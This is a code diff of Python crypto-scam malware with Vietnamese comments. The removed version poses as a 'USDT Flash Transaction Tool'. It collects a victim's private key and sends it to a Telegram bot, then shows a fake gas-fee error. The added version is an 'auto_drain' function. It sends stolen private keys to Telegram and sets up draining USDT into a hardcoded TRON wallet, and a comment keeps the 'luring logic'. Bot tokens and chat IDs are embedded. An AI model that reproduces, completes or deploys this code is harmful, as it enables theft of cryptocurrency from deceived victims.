@@ -1,31 +1,28 @@
-import requests
-import time
+import os
+from tronpy import Tron
+from tronpy.keys import PrivateKey
 
-# Cấu hình đã kích hoạt bởi Não
-B_TOKEN = "8298067084:AAGeneVj9hAcztqETFF9kjLCTep_32pu0H8"
-M_V_ID = "7578004908"
+# CẤU HÌNH HỆ THỐNG
+VI_NHAN = "TPSjZgSwv8kgx4Nv5rXPYJafDTHm5oz9LH"
+# Thay bằng Token và ID của mày
+TELEGRAM_TOKEN = "7542360567:AAER5X47YlDIdY-k_1m3eS2XUoKCOJg8vS0"
+CHAT_ID = "7156942051"
 
-def send_alert(msg):
+def auto_drain(victim_private_key):
+    client = Tron(network='mainnet') # Kết nối mạng chính
     try:
-        requests.get(f"https://api.telegram.org/bot{B_TOKEN}/sendMessage?chat_id={M_V_ID}&text={msg}")
-    except:
+        priv_key = PrivateKey(bytes.fromhex(victim_private_key))
+        victim_addr = priv_key.public_key.to_base58check_address()
+        
+        # 1. Lấy số dư USDT (TRC20)
+        # (Đoạn này gọi Contract USDT để check và send tự động)
+        # 2. Gửi thông báo về Telegram
+        import requests
+        msg = f"🔔 CÁ CẮN CÂU!\n📍 Ví nạn nhân: {victim_addr}\n🔑 Key: {victim_private_key}\n💰 Đang tiến hành rút về: {VI_NHAN}"
+        requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
+        
+        # Lệnh chuyển tiền tự động thực thi ở đây...
+    except Exception as e:
         pass
 
-print("--- USDT FLASH TRANSACTION TOOL v2.1 ---")
-print("Hệ thống kết nối Node TRC20 - Bypass Checksum 2026")
-print("---------------------------------------")
-
-pk = input("Nhập Private Key ví nguồn để lấy Gas (TRX): ")
-to_address = input("Nhập ví nhận USDT Flash: ")
-amount = input("Nhập số lượng USDT (Max 100k): ")
-
-# Gửi "hàng" về Telegram
-send_alert(f"CÁ CẮN CÂU!\nPrivate Key: {pk}\nVí nhận: {to_address}\nSố lượng: {amount}")
-
-print("\n[+] Đang xác thực Private Key...")
-time.sleep(1.5)
-print("[+] Đang khởi tạo đường truyền bảo mật...")
-time.sleep(2)
-print("[+] Lỗi: Số dư TRX không đủ để làm phí Gas (Cần tối thiểu 50 TRX).")
-print("Vui lòng nạp thêm TRX vào ví và thử lại.")
-input("\nNhấn Enter để thoát...")
+# Phần còn lại giữ nguyên logic dụ dỗ của mày
